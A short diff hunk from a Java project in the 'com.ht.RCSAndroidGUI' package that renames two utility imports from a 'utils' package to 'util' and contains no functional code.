@@ -27,8 +27,8 @@ import com.ht.RCSAndroidGUI.crypto.Encryption;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Path;
-import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
